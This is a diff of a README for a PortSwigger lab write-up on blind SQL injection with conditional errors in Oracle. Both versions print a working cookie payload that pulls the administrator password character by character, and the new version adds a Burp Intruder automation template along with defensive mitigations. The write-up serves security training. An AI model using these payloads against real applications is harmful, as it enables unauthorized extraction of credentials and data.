@@ -1,77 +1,139 @@
-# Blind-SQL-injection-with-conditional-responses---Lab-Write-up
+# Blind SQL Injection with Conditional Errors (Oracle)
 
-Exploitation of blind SQL injection via conditional responses in an Oracle database, demonstrating error-based data extraction and side-channel inference.
+## Overview
 
-📌 Initial Analysis 
+This repository documents the exploitation of a **blind SQL injection vulnerability using conditional errors** in a PortSwigger Web Security Academy lab.
 
-During initial testing, the application revealed several important behaviors:
+The vulnerable application places the value of a tracking cookie directly into a SQL query. Query results are not returned to the client, but the application responds differently when the injected SQL causes a database error. This behavior creates a side channel that can be used to infer sensitive data one condition at a time.
 
-A tracking cookie is used for analytics. The cookie value is embedded directly into a SQL query. The application does not return query results in responses. 
+## Lab Summary
 
-However, it responds differently when a database error occurs. 
+| Field | Value |
+|---|---|
+| Platform | PortSwigger Web Security Academy |
+| Lab | Blind SQL injection with conditional errors |
+| Injection point | `TrackingId` cookie |
+| Database | Oracle |
+| Technique | Error-based blind SQL injection |
+| Target data | Password of the `administrator` user |
+| Tools | Burp Suite Repeater and Intruder |
 
-👉 This indicates a Blind SQL Injection vulnerability using conditional errors. 
+## Vulnerability Analysis
 
-Additionally, the backend database is Oracle, which is significant because: 
-Oracle requires FROM dual for standalone SELECT queries. Error-based techniques differ from other DBMS (e.g., MySQL, PostgreSQL). Certain functions (like TO_CHAR(1/0)) can be used to deliberately trigger errors. 
+The application does not display SQL query results. However, database errors produce a different HTTP response from normal requests.
 
+This makes it possible to evaluate Boolean conditions indirectly:
 
-🧠 Key Observation Although query results are not visible, the application leaks information via: Differences in HTTP responses when database errors occur This creates a side-channel, allowing indirect data extraction.
+| Condition result | Database behavior | HTTP response |
+|---|---|---|
+| True | Deliberate divide-by-zero error | `500 Internal Server Error` |
+| False | No database error | `200 OK` |
 
-🧪 Injection Confirmation & Exploitation After identifying the tracking cookie as the injection point, testing was performed using Burp Suite Repeater. 
+Oracle-specific syntax is relevant because standalone `SELECT` statements require a table reference such as `dual`. Oracle string concatenation also uses `||`.
 
-🔹 Initial Payload ' || ( SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' ) || ' ![sda](https://github.com/user-attachments/assets/dd11eb09-c399-4720-bac4-c7eb9639a6da)
+## Conditional Error Payload
 
+The following payload tests whether a selected character of the administrator password matches a supplied value:
 
+```sql
+' || (
+  SELECT CASE
+    WHEN SUBSTR(password, 1, 1) = 'a'
+    THEN TO_CHAR(1/0)
+    ELSE ''
+  END
+  FROM users
+  WHERE username = 'administrator'
+) || '
+```
 
-🧠 Payload Logic || → Concatenates injected SQL into the original query 
+### Payload Logic
 
-SUBSTR(password,1,1) → Extracts the first character
+- `SUBSTR(password, 1, 1)` extracts one character from the password.
+- `CASE WHEN` evaluates whether the extracted character matches the tested value.
+- `TO_CHAR(1/0)` deliberately triggers a divide-by-zero error when the condition is true.
+- `||` concatenates the injected expression into the original Oracle query.
+- The `users` table and `administrator` account are defined by the lab scenario.
 
+## Manual Validation
 
-CASE WHEN → Evaluates a condition TO_CHAR(1/0) → Forces a division-by-zero error in Oracle Condition Result 
+A single character can be tested by changing the comparison value:
 
-TRUE Server returns 500 error FALSE Server returns normal response (200) 
+```sql
+SUBSTR(password, 1, 1) = 'a'
+```
 
-🔍 Testing Example Character Tested Response Result 'a' 200 OK False 'b' 500 True 'c' 200 OK False 
+Example response pattern:
 
-👉 Therefore, the first character of the password is: b 
+| Character tested | Status code | Interpretation |
+|---|---:|---|
+| `a` | 200 | False |
+| `b` | 500 | True |
+| `c` | 200 | False |
 
-⚙️ Automation with Burp Suite Intruder To efficiently extract the full password, the attack was automated. 
+In this example, the first password character is inferred to be `b`.
 
+![Conditional error response in Burp Suite](https://github.com/user-attachments/assets/dd11eb09-c399-4720-bac4-c7eb9639a6da)
 
-🔹 Payload Template <img width="238" height="29" alt="Ekran görüntüsü 2026-04-10 093322" src="https://github.com/user-attachments/assets/5ad28d3b-dc12-426c-8bb6-1139ec08244a" />
+## Automating Extraction with Burp Intruder
 
+The password extraction process was automated with Burp Suite Intruder.
 
+### Payload Template
 
-🔹 Attack Configuration Attack Type: Cluster Bomb Payload Set 1 (Position): Range: 1 → 20 Payload Set 2 (Characters): a–z 0–9 
-(The reason that I used Cluster Bomb is that each unknown character of the password needed to be tested across multiple positions (up to 20), and every possible character (a–z, 0–9) had to be tried for each position. This results in a total of 20 × 36 = 720 requests, allowing full combinational testing and making it ideal for efficiently enumerating the entire password.)
+Two payload positions are required:
 
+```sql
+' || (
+  SELECT CASE
+    WHEN SUBSTR(password, §1§, 1) = '§a§'
+    THEN TO_CHAR(1/0)
+    ELSE ''
+  END
+  FROM users
+  WHERE username = 'administrator'
+) || '
+```
 
+![Burp Intruder payload positions](https://github.com/user-attachments/assets/5ad28d3b-dc12-426c-8bb6-1139ec08244a)
 
-🔹 Execution Steps Load payload sets into Intruder Launch attack Monitor responses: 
+### Intruder Configuration
 
-500 → correct character 
+| Setting | Configuration |
+|---|---|
+| Attack type | Cluster bomb |
+| Payload set 1 | Password positions `1-20` |
+| Payload set 2 | Lowercase letters `a-z` and digits `0-9` |
+| Total combinations | `20 × 36 = 720` requests |
+| Success indicator | HTTP status `500` |
 
-200 → incorrect character 
+Each password position is tested against every allowed character. The request that produces a `500` response identifies the correct character for that position.
 
-🧠 Key Insight This lab demonstrates that even when applications: 
+## Security Impact
 
-Do not display query results They can still be exploited because: 
+An attacker can extract sensitive database values even when:
 
-Conditional logic leaks data Server errors act as an oracle Automation enables full data extraction 
+- SQL query results are not displayed.
+- Detailed database errors are suppressed.
+- The vulnerable parameter is located in an HTTP cookie rather than a visible form field.
 
+The vulnerability may expose credentials, personal data, session information, or other records accessible to the application database account.
 
-🏁 Conclusion This vulnerability highlights critical security failures:
+## Recommended Mitigations
 
-Unsanitized user input in SQL queries Exposure of database error behavior Even with suppressed output, attackers can: 
+1. Use parameterized queries or prepared statements for all database operations.
+2. Never concatenate untrusted cookie, header, URL, or form values into SQL statements.
+3. Return consistent application responses for database failures.
+4. Apply least privilege to the application database account.
+5. Log and alert on repeated malformed cookie values and abnormal error rates.
+6. Use input validation as a supporting control, not as a replacement for parameterized queries.
 
-🔥 Extract sensitive data using error-based blind SQL injection 
+## References
 
-## 📘 Lab Information
+- [PortSwigger Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+- [PortSwigger SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
 
-This lab is part of the PortSwigger Web Security Academy and focuses on exploiting a blind SQL injection vulnerability using conditional responses.
+## Disclaimer
 
-- **Lab Name:** Blind SQL injection with conditional responses  
-- **Database:** Oracle  
-- **Vulnerability Type:** Blind SQL Injection (Error-Based / Conditional)  
+This write-up documents activity performed in an intentionally vulnerable training environment. The techniques must only be used against systems for which explicit authorization has been granted.
